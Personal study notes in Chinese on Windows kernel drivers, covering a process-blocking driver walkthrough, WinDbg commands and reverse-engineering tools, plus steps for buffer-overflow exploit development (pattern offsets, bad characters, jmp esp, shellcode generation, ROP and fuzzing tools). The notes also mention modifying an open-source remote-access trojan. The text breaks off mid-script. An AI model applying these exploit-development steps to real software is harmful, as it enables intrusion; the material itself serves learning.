\u963b\u6b62\u521b\u5efa\u65b0\u8fdb\u7a0b \u5148\u521b\u5efa\u4e00\u4e2a\u9a71\u52a8\u670d\u52a1 sc create BlockNewProc binPath= C:\\Users\\admin\\Desktop\\VectorKernel\\BlockNewProcClient type= kernel \u7981\u7528\u4e86 notepad.exe \uff0cnotepad\u5df2\u7ecf\u4e0d\u80fd\u542f\u52a8\u4e86 \u53d6\u6d88\u7981\u7528\uff0c\u53c8\u53ef\u4ee5\u542f\u52a8\u4e86 \u770b\u770bsys\u4ee3\u7801\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u3002 \u9a71\u52a8\u4e3b\u51fd\u6570 DriverEntry \u3002 NTSTATUS DriverEntry( _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) { //\u5404\u79cd\u521d\u59cb\u5316\uff0c\u4ec5\u652f\u630164\u4f4d\u7cfb\u7edf UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY; PDEVICE_OBJECT pDeviceObject = nullptr; #ifndef _WIN64 KdPrint((DRIVER_PREFIX \"32bit OS is not supported.\\n\")); return STATUS_NOT_SUPPORTED; #endif do { UNICODE_STRING devicePath = RTL_CONSTANT_STRING(DEVICE_PATH); UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH); //\u4e92\u65a5\u9501 ::ExInitializeFastMutex(&g_FastMutex); //\u521b\u5efa\u9a71\u52a8 ntstatus = ::IoCreateDevice( DriverObject, NULL, &devicePath, FILE_DEVICE_UNKNOWN, NULL, FALSE, &pDeviceObject); if (!NT_SUCCESS(ntstatus)) { pDeviceObject = nullptr; KdPrint((DRIVER_PREFIX \"Failed to create device (NTSTATUS = 0x%08X).\\n\", ntstatus)); break; } //\u521b\u5efa\u7b26\u53f7\u94fe\u63a5 ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath); if (!NT_SUCCESS(ntstatus)) { KdPrint((DRIVER_PREFIX \"Failed to create symbolic link (NTSTATUS = 0x%08X).\\n\", ntstatus)); break; } //\u9a71\u52a8\u6ce8\u518c //\u8bbe\u7f6emajor\u529f\u80fd\u5904\u7406\u7a0b\u5e8f\u3002 //major \u529f\u80fd\u5904\u7406\u7a0b\u5e8f\u662f\u9a71\u52a8\u7a0b\u5e8f\u5904\u7406 IRP \u8bf7\u6c42\u7684\u51fd\u6570\u3002IRP\u8bf7\u6c42\u9700\u8981\u7528\u5230\u8fd9\u4e2a\u51fd\u6570\u3002 // I/O \u8bf7\u6c42\u6709\u4e0d\u540c\u7684\u7c7b\u578b\uff0c\u6bcf\u4e2a\u7c7b\u578b\u90fd\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684 major \u529f\u80fd //\u5c06\u9a71\u52a8\u5378\u8f7d\u7a0b\u5e8f\u8bbe\u7f6e\u4e3aDriverUnload\u51fd\u6570 DriverObject->DriverUnload = DriverUnload; //\u8bbe\u7f6e\u521b\u5efa\u8bbe\u5907\u7684IRP\u8bf7\u6c42\u51fd\u6570\u4e3aOnCreateClose DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose; //\u8bbe\u7f6e\u5173\u95ed\u8bbe\u5907\u7684IRP\u8bf7\u6c42\u51fd\u6570\u4e3aOnCreateClose DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose; //\u8bbe\u7f6e\u5904\u7406\u8bbe\u5907\u63a7\u5236\u7684IRP\u8bf7\u6c42\u51fd\u6570\u4e3aOnDeviceControl DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl; KdPrint((DRIVER_PREFIX \"Driver is loaded successfully.\\n\")); } while (false); if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr)) ::IoDeleteDevice(pDeviceObject); return ntstatus; } \u9a71\u52a8\u5378\u8f7d\u7a0b\u5e8f\u51fd\u6570 DriverUnload void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) { UNICODE_STRING symlinkPath = RTL_CONSTANT_STRING(SYMLINK_PATH); ::IoDeleteSymbolicLink(&symlinkPath); //\u5220\u9664\u7b26\u53f7\u94fe\u63a5 ::IoDeleteDevice(DriverObject->DeviceObject); //\u5220\u9664\u8bbe\u5907\u5bf9\u8c61 //\u5982\u679c\u5b58\u5728Callback\u51fd\u6570\uff0c\u5219\u6ce8\u9500 if (g_CallbackRegistered) { ::PsSetCreateProcessNotifyRoutineEx2( PsCreateProcessNotifySubsystems, (PVOID)ProcessBlockRoutine, TRUE); } KdPrint((DRIVER_PREFIX \"Driver is unloaded.\\n\")); } \u521b\u5efa\u548c\u5173\u95ed\u8bbe\u5907\u51fd\u6570 OnCreateClose \u3002 \u4f5c\u7528\u662f\u8bbe\u7f6e\u72b6\u6001 NTSTATUS OnCreateClose( _Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); NTSTATUS ntstatus = STATUS_SUCCESS; Irp->IoStatus.Status = ntstatus; Irp->IoStatus.Information = 0u; IoCompleteRequest(Irp, 0); return ntstatus; } \u63a7\u5236\u51fd\u6570 NTSTATUS OnDeviceControl( _Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) { UNREFERENCED_PARAMETER(DeviceObject); NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST; PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp); auto& dic = irpSp->Parameters.DeviceIoControl; ULONG_PTR info = NULL; switch (dic.IoControlCode) { //IOCTL_SET_PROCESS_FILENAME\u662f\u8fdb\u5236\u521b\u5efa\u76f8\u5e94\u8fdb\u7a0b\u7684\u4ee3\u7801 case IOCTL_SET_PROCESS_FILENAME: if (dic.InputBufferLength < sizeof(BLOCK_FILENAME_INFO)) { ntstatus = STATUS_BUFFER_TOO_SMALL; break; } //\u83b7\u53d6\u4e92\u65a5\u9501 ::ExAcquireFastMutex(&g_FastMutex); //\u8fd9\u91cc\u83b7\u53d6\u4f20\u5165\u7684\u6587\u4ef6\u540d\u4fdd\u5b58\u5230g_ImageFileNameSuffix[] ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258); g_ImageFileNameSuffix[0] = L'\\\\'; ::memcpy(&g_ImageFileNameSuffix[1], Irp->AssociatedIrp.SystemBuffer, sizeof(BLOCK_FILENAME_INFO)); g_ImageFileNameSuffix[257] = L'\\0'; KdPrint((DRIVER_PREFIX \"Target ImageFileName pattern is updated to \\\"%ws\\\".\\n\", &g_ImageFileNameSuffix)); //\u6ce8\u518ccallback\u51fd\u6570PsSetCreateProcessNotifyRoutineEx2\uff0c\u6267\u884cProcessBlockRoutine\u9501\u8fdb\u7a0b\u521b\u5efa\u7684\u51fd\u6570 if (!g_CallbackRegistered) { ntstatus = ::PsSetCreateProcessNotifyRoutineEx2( PsCreateProcessNotifySubsystems, (PVOID)ProcessBlockRoutine, FALSE); if (!NT_SUCCESS(ntstatus)) { KdPrint((DRIVER_PREFIX \"Failed to register Process Notify Routine (NTSTATUS = 0x%08X).\", ntstatus)); break; } else { g_CallbackRegistered = TRUE; KdPrint((DRIVER_PREFIX \"Process Notify Callback is registered successfully.\\n\")); } } //\u91ca\u653e\u4e92\u65a5\u9501 ::ExReleaseFastMutex(&g_FastMutex); info = ::wcslen(g_ImageFileNameSuffix) * sizeof(WCHAR); ntstatus = STATUS_SUCCESS; break; //IOCTL_UNREGISTER_CALLBACK\u5206\u652f\u662f\u91ca\u653e\u56de\u8c03\u51fd\u6570 case IOCTL_UNREGISTER_CALLBACK: ::ExAcquireFastMutex(&g_FastMutex); if (g_CallbackRegistered) { ::memset(g_ImageFileNameSuffix, 0, sizeof(WCHAR) * 258); ntstatus = ::PsSetCreateProcessNotifyRoutineEx2( PsCreateProcessNotifySubsystems, (PVOID)ProcessBlockRoutine, TRUE); if (!NT_SUCCESS(ntstatus)) { KdPrint((DRIVER_PREFIX \"Failed to unregister Process Notify Callback (NTSTATUS = 0x%08X).\\n\", ntstatus)); } else { g_CallbackRegistered = FALSE; KdPrint((DRIVER_PREFIX \"Process Notify Callback is unregistered successfully.\\n\")); } } else { KdPrint((DRIVER_PREFIX \"Process Notify Callback is not registered.\\n\")); } ::ExReleaseFastMutex(&g_FastMutex); } //\u5b8c\u6210IRP\u8bf7\u6c42 Irp->IoStatus.Status = ntstatus; Irp->IoStatus.Information = info; IoCompleteRequest(Irp, 0); return ntstatus; } \u8fd9\u6837\u770b\u6765\u662f\u901a\u8fc7\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u63a7\u5236\u7684\u56de\u8c03\u51fd\u6570\u6765\u5b9e\u73b0\u7981\u6b62\u8fdb\u7a0b\u521b\u5efa\u7684\u3002 ProcessBlockRoutine \u51fd\u6570 \u5b9e\u73b0\u529f\u80fd\u903b\u8f91\u5c31\u662f CreateInfo->CreationStatus = STATUS_ACCESS_DENIED \u5c06 CreateInfo \u7684 CreationStatus \u8bbe\u7f6e\u4e3a STATUS_ACCESS_DENIED void ProcessBlockRoutine( _Inout_ PEPROCESS Process, _In_ HANDLE ProcessId, _Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); UNREFERENCED_PARAMETER(ProcessId); if (CreateInfo != nullptr) { ::ExAcquireFastMutex(&g_FastMutex); if (::wcslen(g_ImageFileNameSuffix) > 0) { UNICODE_STRING suffix{ 0 }; ::RtlInitUnicodeString(&suffix, g_ImageFileNameSuffix); if (::RtlSuffixUnicodeString(&suffix, (PUNICODE_STRING)CreateInfo->ImageFileName, TRUE)) { CreateInfo->CreationStatus = STATUS_ACCESS_DENIED; KdPrint((DRIVER_PREFIX \"Blocked Process: %wZ\\n\", (PUNICODE_STRING)CreateInfo->ImageFileName)); } else { KdPrint((DRIVER_PREFIX \"Allowed Process: %wZ\\n\", (PUNICODE_STRING)CreateInfo->ImageFileName)); } } else { KdPrint((DRIVER_PREFIX \"Allowed Process: %wZ\\n\", (PUNICODE_STRING)CreateInfo->ImageFileName)); } ::ExReleaseFastMutex(&g_FastMutex); } } CreateInfo \u7ed3\u6784\u4f53 typedef struct _PPS_CREATE_NOTIFY_INFO { UNICODE_STRING ImageFileName; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u6620\u50cf\u6587\u4ef6\u540d\u3002\u8be5\u6210\u5458\u662f\u4e00\u4e2a `UNICODE_STRING` \u7ed3\u6784\uff0c\u5305\u542b\u6587\u4ef6\u540d\u7684\u5b57\u7b26\u4e32\u548c\u957f\u5ea6 UNICODE_STRING ProcessName; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u4e3b\u6a21\u5757\u540d\u3002\u8be5\u6210\u5458\u4e5f\u662f\u4e00\u4e2a `UNICODE_STRING` \u7ed3\u6784 HANDLE ProcessId; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u53e5\u67c4\u3002\u8be5\u6210\u5458\u662f\u4e00\u4e2a `HANDLE` \u7c7b\u578b NTSTATUS CreationStatus; //\u6210\u5458\u5305\u542b\u65b0\u8fdb\u7a0b\u7684\u521b\u5efa\u72b6\u6001\u3002\u8be5\u6210\u5458\u662f\u4e00\u4e2a `NTSTATUS` \u7c7b\u578b\u3002 } PPS_CREATE_NOTIFY_INFO; CreationStatus \u662f\u4e00\u4e2a NTSTATUS \u503c\uff0c\u5c06\u503c\u5b9a\u4e49\u6210\u9519\u8bef\u7c7b\u578b\u7684\u503c\u5c31\u53ef\u4ee5\u963b\u6b62\u8fdb\u7a0b\u521b\u5efa\u3002 \u5fae\u8f6f\u5b9a\u4e49\u7684\u6240\u6709 NTSTATUS \u503c\u53ef\u5728 ntstatus.h \u627e\u5230\u3002 \u7531\u4e8e\u5b9a\u4e49\u7684\u662f STATUS_ACCESS_DENIED \uff0c\u6240\u4ee5\u7cfb\u7edf\u51fa\u73b0\u7684\u62d2\u7edd\u8bbf\u95ee\u5f39\u7a97\uff0c\u6539\u6210\u5176\u4ed6\u72b6\u6001\u53c8\u4f1a\u662f\u53e6\u4e00\u79cd\u5f39\u7a97\u6216\u662f\u65e0\u5f39\u7a97\u3002 \u4f46\u8fd9\u4e9b\u90fd\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u9519\u8bef\u72b6\u6001\u963b\u6b62\u4e86\u8fdb\u7a0b\u7684\u521b\u5efa\u3002 \u7528windbg\u8c03\u8bd5\u4e00\u4e0b\u9a71\u52a8\uff0c\u5728 BlockNewProcDrv_x64 \u9a71\u52a8\u4e2d\u53ef\u627e\u5230 _PPS_CREATE_NOTIFY_INFO \u7ed3\u6784\u4f53 \u5728 ProcessBlockRoutine \u51fd\u6570\u8c03\u7528\u524d\u4e0b\u65ad\u70b9\uff0c\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u4f20\u5165\u7684\u53d8\u91cf Windbg https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/commands https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/standard-debugging-techniques \u5e38\u7528\u547d\u4ee4 .process \u67e5\u770b\u8fdb\u7a0b\u4fe1\u606f .process 0 0 cmd.exe \u67e5\u627e\u8fdb\u7a0b lm \u67e5\u770b\u6a21\u5757 0:009> lm start end module name 00007ff6`f33c0000 00007ff6`f34da000 Notepad C (no symbols) 00007ffb`9a5c0000 00007ffb`9a77c000 DUI70 (deferred) 00007ffb`b9350000 00007ffb`b9933000 Microsoft_UI_Xaml (deferred) 00007ffb`c0b40000 00007ffb`c0e78000 riched20 (deferred) 00007ffb`c3550000 00007ffb`c3578000 edputil (deferred) ~ \u67e5\u770b\u7ebf\u7a0b 0:009> ~ 0 Id: f90.400c cSuspend: 1 Teb: 00000041`0f6b4000 Unfrozen 1 Id: f90.15ec Suspend: 1 Teb: 00000041`0f6b6000 Unfrozen 2 Id: f90.4a18 Suspend: 1 Teb: 00000041`0f6b8000 Unfrozen 3 Id: f90.3ea4 Suspend: 1 Teb: 00000041`0f6ba000 Unfrozen 4 Id: f90.3840 Suspend: 1 Teb: 00000041`0f6bc000 Unfrozen 5 Id: f90.1a50 Suspend: 1 Teb: 00000041`0f6be000 Unfrozen 6 Id: f90.4514 Suspend: 1 Teb: 00000041`0f6c0000 Unfrozen 7 Id: f90.3d30 Suspend: 1 Teb: 00000041`0f6c2000 Unfrozen k \u67e5\u770b\u6808 0:009> k # Child-SP RetAddr Call Site 00 00000041`100fc558 00007ffc`02a55370 ntdll!NtCreateFile 01 00000041`100fc560 00007ffc`02a54cdc KERNELBASE!CreateFileInternal+0x590 02 00000041`100fc6d0 00007ffc`02a5488c KERNELBASE!CreateFileW+0x7c 03 00000041`100fc750 00007ffc`02a563c0 KERNELBASE!BasepLoadLibraryAsDataFileInternal+0x4dc 04 00000041`100fc980 00007ffc`04707ddc KERNELBASE!LoadLibraryExW+0xe0 05 00000041`100fc9f0 00007ffc`04707bea SHELL32!GetShellStyleHInstance+0xcc 06 00000041`100fcd20 00007ffc`04707ba0 SHELL32!UpdateStyle+0x1e 07 00000041`100fcd60 00007ffc`04707a93 SHELL32!DUI_ShellStyleSheet_InitProcess+0x94 08 00000041`100fcda0 00007ffc`0474c2d7 SHELL32!InitializeDirectUI+0x4b u \u67e5\u770b\u5f53\u524d\u6c47\u7f16\u4ee3\u7801 0:009> u ntdll!NtCreateFile+0x18: 00007ffc`0528fe18 0f1f840000000000 nop dword ptr [rax+rax] ntdll!NtQueryEvent: 00007ffc`0528fe20 4c8bd1 mov r10,rcx 00007ffc`0528fe23 b856000000 mov eax,56h 00007ffc`0528fe28 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffc`0528fe30 7503 jne ntdll!NtQueryEvent+0x15 (00007ffc`0528fe35) 00007ffc`0528fe32 0f05 syscall 00007ffc`0528fe34 c3 ret 00007ffc`0528fe35 cd2e int 2Eh r \u67e5\u770b\u5bc4\u5b58\u5668 0:009> r rax=0000000000000005 rbx=0000000000000000 rcx=00000041100fc5e0 rdx=0000000080100080 rsi=0000000000000000 rdi=0000000000000000 rip=00007ffc0528fe00 rsp=00000041100fc558 rbp=00000041100fc660 r8=00000041100fc640 r9=00000041100fc5e8 r10=ce709ee7125b9070 r11=00000041100fc540 r12=0000000000000001 r13=0000000000000000 r14=0000000080100080 r15=0000000000000000 iopl=0 nv up ei ng nz na pe nc cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000282 ntdll!NtCreateFile: 00007ffc`0528fe00 4c8bd1 mov r10,rcx 0:009> r al al=5 0:009> r eax eax=5 0:009> r rax rax=0000000000000005 d \u67e5\u770b\u5185\u5b58 0:009> d 00007ffc`0528fe00 4c 8b d1 b8 55 00 00 00-f6 04 25 08 03 fe 7f 01 L...U.....%..... 00007ffc`0528fe10 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... 00007ffc`0528fe20 4c 8b d1 b8 56 00 00 00-f6 04 25 08 03 fe 7f 01 L...V.....%..... 00007ffc`0528fe30 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... 00007ffc`0528fe40 4c 8b d1 b8 57 00 00 00-f6 04 25 08 03 fe 7f 01 L...W.....%..... 00007ffc`0528fe50 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... 00007ffc`0528fe60 4c 8b d1 b8 58 00 00 00-f6 04 25 08 03 fe 7f 01 L...X.....%..... 00007ffc`0528fe70 75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00 u............... x \u5339\u914d\u7b26\u53f7\uff0c\u53ef\u7528\u6765\u67e5\u627e\u51fd\u6570\u5730\u5740 0:009> x ntdll!createf* Breakpoint 0 hit ntdll!NtCreateFile: 00007ffc`0528fe00 4c8bd1 mov r10,rcx bp\u3001bu\u3001bm \u8bbe\u7f6e\u65ad\u70b9 \u6839\u636e\u5730\u5740\u65ad\u70b9 1.\u6839\u636e\u9759\u6001\u627e\u5230\u504f\u79fb\u91cf 2.\u67e5\u770b\u5f53\u524d\u6a21\u5757\u865a\u62df\u5730\u5740+\u504f\u79fb\u91cf\u65ad\u70b9 0:002> lm start end module name 00007ff6`07c20000 00007ff6`07c36000 a T (no symbols) 00007ffb`ff880000 00007ffb`ff917000 apphelp (deferred) 00007ffc`02a30000 00007ffc`02dd5000 KERNELBASE (deferred) 00007ffc`02fc0000 00007ffc`03084000 KERNEL32 (pdb symbols) E:\\Windows Kits\\10\\Debuggers\\x64\\sym\\kernel32.pdb\\6F7660385E7D8D33ED9B5A39B03822F01\\kernel32.pdb 00007ffc`04f60000 00007ffc`05007000 msvcrt (deferred) 00007ffc`051f0000 00007ffc`05407000 ntdll (pdb symbols) E:\\Windows Kits\\10\\Debuggers\\x64\\sym\\ntdll.pdb\\58A282C24AEE7E03A8CF8CB0A782CE0C1\\ntdll.pdb 0:002> u 00007ff6`07c214c7 a+0x14c7: 00007ff6`07c214c7 e8c7ffffff call a+0x1493 (00007ff6`07c21493) 00007ff6`07c214cc 4889ca mov rdx,rcx 00007ff6`07c214cf 8a02 mov al,byte ptr [rdx] 00007ff6`07c214d1 4883c202 add rdx,2 00007ff6`07c214d5 84c0 test al,al 00007ff6`07c214d7 7407 je a+0x14e0 (00007ff6`07c214e0) 00007ff6`07c214d9 83e00f and eax,0Fh 00007ff6`07c214dc 01c6 add esi,eax 0:002> bp 00007ff6`07c214c7 \u6279\u91cf\u65ad\u70b9 0:000> bm ntdll!ZwTer* 2: 00007ffc`05292d30 @!\"ntdll!ZwTerminateJobObject\" 3: 00007ffc`05292d10 @!\"ntdll!ZwTerminateEnclave\" 4: 00007ffc`0528fdc0 @!\"ntdll!ZwTerminateThread\" 5: 00007ffc`0528f8e0 @!\"ntdll!ZwTerminateProcess\" 0:000> bl 1 e Disable Clear 00007ff6`07c214cc 0001 (0001) 0:**** a+0x14cc 2 e Disable Clear 00007ffc`05292d30 0001 (0001) 0:**** ntdll!NtTerminateJobObject 3 e Disable Clear 00007ffc`05292d10 0001 (0001) 0:**** ntdll!NtTerminateEnclave 4 e Disable Clear 00007ffc`0528fdc0 0001 (0001) 0:**** ntdll!NtTerminateThread 5 e Disable Clear 00007ffc`0528f8e0 0001 (0001) 0:**** ntdll!NtTerminateProcess \u641c\u7d22\u5185\u5b58\u7a7a\u95f4 0:000> s -a 0 L?0x00007ff6ffffffff \"aaaaaaaa\" 000000ad`83dffc4c 61 61 61 61 61 61 61 61-00 00 00 00 00 00 00 00 aaaaaaaa........ \u6570\u636e\u7c7b\u578b\u8f6c\u6362 0:000> .formats 6161616161616262 Evaluate expression: Hex: 61616161`61616262 Decimal: 7016996765293437538 Octal: 0605413026054130261142 Binary: 01100001 01100001 01100001 01100001 01100001 01100001 01100010 01100010 Chars: aaaaaabb Time: Sat Dec 24 08:48:49.343 23836 (UTC + 8:00) Float: low 2.5985e+020 high 2.59846e+020 Double: 1.22176e+161 \u5185\u5b58\u72b6\u6001 0:000> !address Mapping file section regions... Mapping module regions... Mapping PEB regions... Mapping TEB and stack regions... Mapping heap regions... Mapping page heap regions... Mapping other regions... Mapping stack trace database regions... Mapping activation context regions... BaseAddress EndAddress+1 RegionSize Type State Protect Usage -------------------------------------------------------------------------------------------------------------------------- + 0`00000000 0`7ffe0000 0`7ffe0000 MEM_FREE Free + 0`7ffe0000 0`7ffe1000 0`00001000 MEM_PRIVATE MEM_COMMIT Other [User Shared Data] + 0`7ffe1000 0`7ffe6000 0`00005000 MEM_FREE Free + 0`7ffe6000 0`7ffe7000 0`00001000 MEM_PRIVATE MEM_COMMIT <unknown> [..........O...H.] + 0`7ffe7000 ad`83a00000 ad`03a19000 MEM_FREE Free + ad`83a00000 ad`83af0000 0`000f0000 MEM_PRIVATE MEM_RESERVE <unknown> ad`83af0000 ad`83af1000 0`00001000 MEM_PRIVATE MEM_COMMIT PEB [3e3c] ad`83af1000 ad`83af3000 0`00002000 MEM_PRIVATE MEM_COMMIT TEB [~0; 3e3c.517c] ad`83af3000 ad`83af5000 0`00002000 MEM_PRIVATE MEM_COMMIT TEB [~1; 3e3c.211c] ad`83af5000 ad`83c00000 0`0010b000 MEM_PRIVATE MEM_RESERVE <unknown> + ad`83c00000 ad`83dfa000 0`001fa000 MEM_PRIVATE MEM_RESERVE Stack [~0; 3e3c.517c] ad`83dfa000 ad`83dfd000 0`00003000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE | PAGE_GUARD Stack [~0; 3e3c.517c] ad`83dfd000 ad`83e00000 0`00003000 MEM_PRIVATE MEM_COMMIT Stack [~0; 3e3c.517c] + ad`83e00000 ad`83ffc000 0`001fc000 MEM_PRIVATE MEM_RESERVE Stack [~1; 3e3c.211c] ad`83ffc000 ad`83fff000 0`00003000 MEM_PRIVATE MEM_COMMIT PAGE_READWRITE | PAGE_GUARD Stack [~1; 3e3c.211c] ad`83fff000 ad`84000000 0`00001000 MEM_PRIVATE MEM_COMMIT Stack [~1; 3e3c.211c] debug kernel \\\\.\\pipe\\pa bcdedit /debug on bcdedit /dbgsettings NET HOSTIP:1.1.1.1 PORT:50000 bcdedit /dbgsettings serial debugport:2 baudrate:115200 \u4e66\u7c4d\u5de5\u5177 Reverse Engineering for Beginners Windows \u4ee4\u724c\u76f8\u5173\u5b66\u4e60 https://github.com/daem0nc0re/PrivFu/ \u5de5\u5177 \u5728\u7ebf\u6e90\u7801\u6c47\u7f16\u4e92\u8f6c\u5de5\u5177 https://godbolt.org/ PE Tools \u770bpe\u7684 file file 1.exe \u770b\u6587\u4ef6\u683c\u5f0f\u7c7b\u578b\u7684\uff0c\u6839\u636e\u6587\u4ef6\u5934\u7684\u6587\u4ef6\u5e7b\u6570\u6765\u68c0\u67e5\u3002 \u4ec0\u4e48\u662f\u5e7b\u6570\uff1f\u5e7b\u6570\u5c31\u662f\u4e0d\u540c\u683c\u5f0f\u6587\u4ef6\u7684\u6307\u7eb9\uff0c\u4f8b\u5982MZ\u662fPE\u6587\u4ef6\u7684\u6307\u7eb9\uff0c16\u8fdb\u5236\u5e7b\u6570\u662f 4D 5A ldd ldd 1.exe \u770b\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u9700\u8981\u54ea\u4e9b\u94fe\u63a5\u5e93\u7684 dumpbin vscode\u81ea\u5e26\u7684\u7a0b\u5e8f dumpbin.exe /imports 1.exe dumpbin.exe /exports 1.exe dumpbin /dependents 1.exe \u8fd9\u4e2a\u8ddfldd\u4e00\u6837 string \u67e5\u770b\u5b57\u7b26\u4e32 speakeasy \u6a21\u62dfshellcode\u8fd0\u884c\uff0c\u53ef\u7528\u4e8e\u67e5\u627eCS profile\u7684\u5730\u5740\u3001\u8bf7\u6c42\u4fe1\u606f\u7b49 https://github.com/mandiant/speakeasy AsyncRAT-C-Sharp \u4e00\u6b3e\u5f00\u6e90\u8fdc\u63a7\uff0c\u53ef\u4ee5\u4e8c\u5f00\u4e00\u4e0b\u6539\u7740\u81ea\u5df1\u73a9---\u5f85\u529e https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp \u53c2\u8003\u8d44\u6599 Inter\u67b6\u6784\u624b\u518c.pdf https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html \u547d\u4ee4 pattern msf-pattern_create //\u751f\u6210\u6307\u5b9a\u957f\u5ea6\u7684\u6570\u636e Usage: msf-pattern_create [options] Example: msf-pattern_create -l 50 -s ABC,def,123 Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf Options: -l, --length <length> The length of the pattern -s, --sets <ABC,def,123> Custom Pattern Sets -h, --help Show this message \u8ba1\u7b97\u504f\u79fb\u91cf \u8fd9\u662f\u6839\u636emsf\u81ea\u5df1\u751f\u6210\u7684\u552f\u4e00\u5b57\u7b26\u4e32\u6765\u5b9a\u4f4d\u7684, -q \u7ed9\u5b57\u7b26\u4e32\u768416\u8fdb\u5236\uff0c\u5de5\u5177\u4f1a\u81ea\u52a8\u8ba1\u7b97\u51faEIP\u7684\u504f\u79fb\u91cf \u2514\u2500# msf-pattern_offset -q 00696CA9 [*] Exact match at offset 146 \u6240\u6709\u5b57\u7b26 \\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff nasm \u6c47\u7f16\u6307\u4ee4\u8f6c16\u8fdb\u5236 \u4f7f\u7528MSF\u7684\u81ea\u5e26\u5de5\u5177 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb nasm > jmp esp 00000000 FFE4 jmp esp nasm > call esp 00000000 FFD4 call esp \u7f13\u51b2\u533a\u6ea2\u51fashellcode\u751f\u6210 generate -b \"\\x00\\x0a\\x0d\" Ropper ROP\u94fe\u5bfb\u627e\u5de5\u5177 https://github.com/sashs/Ropper \u5de5\u5177 Ghidra\u3001IDA boofuzz\u4f7f\u7528 \u5b98\u65b9\u6307\u5357 https://boofuzz.readthedocs.io/ \u6ce8\u610f\uff1a\u811a\u672c\u540d\u79f0\u4e0d\u80fd\u662fboofuzz.py\uff0c\u5426\u5219\u4f1a\u6709\u5f02\u5e38 \u5b89\u88c5boofuzz python3 -m pip install boofuzz \u4e00\u4e2a\u5b8c\u6574\u7684\u6837\u4f8b\u811a\u672c\u5982\u4e0b #!/usr/bin/python from boofuzz import * host = '192.168.14.139' port = 9999 def main(): ses = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')), sleep_time = 